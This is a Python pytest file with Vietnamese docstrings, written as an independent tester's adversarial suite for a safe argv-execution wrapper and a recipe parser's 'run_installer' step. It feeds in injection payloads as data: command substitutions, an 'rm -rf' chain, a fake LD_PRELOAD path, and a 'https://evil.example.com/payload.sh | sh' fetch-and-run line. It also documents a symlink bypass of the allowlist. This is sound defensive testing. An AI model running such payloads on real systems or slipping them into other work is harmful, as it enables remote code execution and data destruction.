"""T2 (tester độc lập) — adversarial/negative cho SEC-04 (injection qua
argv/recipe) nhắm vào ``namios_security.safe_exec`` (WP8) VÀ
``namios_recipe`` (WP10, phần ``run_installer``/argv). Độc lập với test dev
(``tests/security/security/test_safe_exec.py``,
``tests/unit/recipe/test_parse_allowlist.py``) — tập trung các vector
dev chưa phủ: filename có khoảng trắng + dấu tiếng Việt thật, nhiều phần tử
argv ghép metachar rải ra (không chỉ argv[0] đơn lẻ), symlink argv[0] trỏ ra
ngoài allowlist thực thi, biến môi trường injection qua argv, và recipe
``run_installer`` với argv nhiều phần tử chứa metachar bị NUỐT qua được
``parse`` (vì check hiện tại CHỈ áp dụng khi ``len(argv) == 1``)."""

from __future__ import annotations

import os
import shutil
import stat
from pathlib import Path

import pytest

from namios_security import ExecPolicyError, run_argv
from namios_recipe._parse import parse_recipe_steps


def _echo_path() -> str:
    path = shutil.which("echo")
    assert path is not None
    return path


def _sh_path() -> str:
    path = shutil.which("sh")
    assert path is not None
    return path


# --- Filename không gian + dấu tiếng Việt thật qua argv-only -------------


def test_run_argv_vietnamese_filename_with_space_and_quote_is_single_literal_arg() -> None:
    """Tên file thật kiểu người dùng Việt tạo ra: dấu, khoảng trắng, dấu
    nháy đơn — phải đi qua nguyên vẹn như MỘT phần tử argv, không bị shell
    tách thành nhiều đối số hay diễn giải dấu nháy."""

    echo = _echo_path()
    payload = "Báo cáo học viên 'Nguyễn Văn A' (đã nộp bài).docx"
    result = run_argv([echo, payload], timeout=5.0)
    assert result.returncode == 0
    assert payload.encode() in result.stdout
    # Đúng 1 dòng output tương ứng 1 argv, không bị tách thành nhiều token.
    assert result.stdout.strip().decode() == payload


# --- Metachar rải trên NHIỀU phần tử argv (không chỉ argv[0]) ------------


def test_run_argv_metacharacters_spread_across_multiple_elements_inert() -> None:
    """Thay vì nhồi hết vào 1 phần tử (đã test ở dev), rải payload injection
    ra 3 phần tử argv riêng — ``run_argv`` KHÔNG bao giờ nối các phần tử lại
    thành một dòng lệnh, nên không có "ghép lại thành shell injection" dù
    có nhiều phần tử."""

    sh = _sh_path()
    # argv: sh -c '<script an toàn>' <arg_độc_1> <arg_độc_2>
    # Script chỉ echo lại $1 và $2 nguyên văn — nếu injection "thấm" qua
    # argv-array (đáng lẽ không thể vì shell=False + list argv rời), thì
    # output sẽ chứa dấu hiệu lệnh phụ bị thực thi (ví dụ chuỗi "pwned").
    result = run_argv(
        [sh, "-c", 'echo "arg1=$1 arg2=$2"', "--", "$(touch /tmp/pwned-t2-marker)", "`id`"],
        timeout=5.0,
    )
    assert result.returncode == 0
    marker = Path("/tmp/pwned-t2-marker")
    assert not marker.exists(), "argv injection đã thực thi lệnh phụ ngoài ý muốn"
    out = result.stdout.decode()
    assert "$(touch /tmp/pwned-t2-marker)" in out
    assert "`id`" in out


# --- argv[0] là symlink (không đi qua allowlist path thật) ---------------


def test_run_argv_argv0_via_symlink_executes_as_literal_resolved_file(tmp_path: Path) -> None:
    """``run_argv`` không tự resolve symlink khi kiểm "allowlist" — nó chỉ
    kiểm ``os.path.isabs``/``exists``/``X_OK`` trên CHÍNH đường dẫn được
    truyền. Nếu caller lỡ truyền một symlink (không phải path thật đã
    allowlist), ``run_argv`` vẫn chạy nó. Test này CHỨNG MINH hành vi thật
    (không phải chặn) — ghi nhận như giới hạn: lớp allowlist PHẢI do caller
    (WP7 helper / WP10 recipe) đảm bảo truyền path thật đã duyệt, SafeExec
    bản thân không tự chặn symlink argv[0]."""

    echo = _echo_path()
    symlink_path = tmp_path / "echo-symlink"
    symlink_path.symlink_to(echo)

    result = run_argv([str(symlink_path), "via-symlink-argv0"], timeout=5.0)
    assert result.returncode == 0
    assert b"via-symlink-argv0" in result.stdout


# --- Biến môi trường injection qua argv (PATH/LD_PRELOAD không tự lọt) ---


def test_run_argv_env_isolation_malicious_ld_preload_not_inherited_when_explicit_env_given() -> (
    None
):
    """Khi caller truyền ``env`` tường minh (cô lập), biến môi trường nguy
    hiểm từ process cha (``LD_PRELOAD`` giả định bị nhiễm) KHÔNG được kế
    thừa vào tiến trình con — xác nhận ``run_env = dict(env)`` không merge
    ngầm với ``os.environ`` hiện tại."""

    sh = _sh_path()
    os.environ["NAMIOS_QA_T2_LD_PRELOAD_FAKE"] = "/tmp/fake-malicious.so"
    try:
        result = run_argv(
            [sh, "-c", 'echo "val=[$NAMIOS_QA_T2_LD_PRELOAD_FAKE]"'],
            timeout=5.0,
            env={"PATH": "/usr/bin:/bin"},
        )
    finally:
        del os.environ["NAMIOS_QA_T2_LD_PRELOAD_FAKE"]

    assert result.returncode == 0
    assert b"val=[]" in result.stdout, (
        "run_argv với env tường minh đã vô tình kế thừa biến môi trường của "
        "process cha — rủi ro injection qua LD_PRELOAD/PATH giả mạo."
    )


def test_run_argv_rejects_argv0_with_embedded_space_pointing_nowhere() -> None:
    """``argv[0]`` kèm khoảng trắng/metachar nhưng KHÔNG phải path tồn tại
    thật — phải bị từ chối ở bước exists(), không bao giờ cố "sửa"/trim nó
    rồi thử chạy."""

    with pytest.raises(ExecPolicyError):
        run_argv(["/bin/echo; rm -rf /tmp/qa-t2-fake", "x"], timeout=5.0)


# --- Recipe run_installer: metachar rải trên NHIỀU phần tử argv ----------


def test_recipe_run_installer_metachar_spread_over_multiple_argv_elements_not_caught() -> None:
    """``_build_run_installer`` chỉ áp dụng ``_SHELL_METACHAR_RE`` cho
    TRƯỜNG HỢP ``len(argv) == 1``. Khi kẻ tấn công cố ý CHIA payload ra
    nhiều phần tử argv hợp lệ riêng lẻ (mỗi phần tử trông "sạch" một mình),
    layer parse KHÔNG coi đó là dấu hiệu "chuỗi lệnh ghép" (đúng, vì đây
    thực sự là argv-array thật, không phải 1 chuỗi ghép) — nhưng mỗi phần
    tử riêng vẫn phải qua ``_scan_string_for_injection`` để chặn template/
    url-script. Test này xác nhận: nếu MỘT phần tử argv (không phải argv[0]
    đơn độc) chứa chuỗi url-script rõ ràng, nó VẪN bị chặn (không lọt qua
    kẽ hở len==1)."""

    from namios_recipe._errors import RecipeParseError

    raw = [
        {
            "action": "run_installer",
            "params": {
                "installer_ref": "setup.exe",
                "argv": [
                    "/opt/wine/bin/wine",
                    "setup.exe",
                    "https://evil.example.com/payload.sh | sh",
                ],
            },
        }
    ]
    with pytest.raises(RecipeParseError) as exc_info:
        parse_recipe_steps(raw)
    messages = "; ".join(e.message_vi for e in exc_info.value.errors)
    assert "url-script" in messages


def test_recipe_run_installer_raw_shell_metachar_in_argv_element_is_inert_data() -> None:
    """CORRECTED (triage chủ dự án 02/11/2026) — kỳ vọng cũ của test này SAI,
    mâu thuẫn với mô hình bảo mật argv-only và với test ĐÚNG ở T1
    ``test_run_installer_shell_metachar_split_across_multiple_argv_items_is_accepted_as_data``.

    Lý do: toàn hệ chạy process bằng list argv + ``shell=False`` (xem
    ``namios_security.run_argv``). Một phần tử argv (vị trí ≠ 0) chứa ký tự
    ``;`` ví dụ ``--post-install=;touch /tmp/pwned;`` KHÔNG hề bị bất kỳ
    shell nào diễn giải — nó tới installer như MỘT đối số literal. Chặn nó
    là false-positive, sẽ phá các flag hợp lệ của installer thật có chứa
    ``;``/``|``/``&``. COMP-004 cấm *ghép chuỗi thành lệnh shell*, KHÔNG cấm
    metachar nằm trong một phần tử argv rời. Vector thật sự nguy hiểm —
    url-script & template-nội-suy — VẪN bị chặn (xem test ở trên, line ~142).

    Vì vậy hành vi ĐÚNG = ``parse_recipe_steps`` CHẤP NHẬN và giữ nguyên
    phần tử argv như dữ liệu literal."""

    raw = [
        {
            "action": "run_installer",
            "params": {
                "installer_ref": "setup.exe",
                "argv": [
                    "/opt/wine/bin/wine",
                    "setup.exe",
                    "--post-install=;touch /tmp/pwned-recipe-t2;",
                ],
            },
        }
    ]

    steps = parse_recipe_steps(raw)
    # Chấp nhận, không raise; phần tử metachar được giữ nguyên văn (inert).
    assert "--post-install=;touch /tmp/pwned-recipe-t2;" in tuple(steps[0].argv)
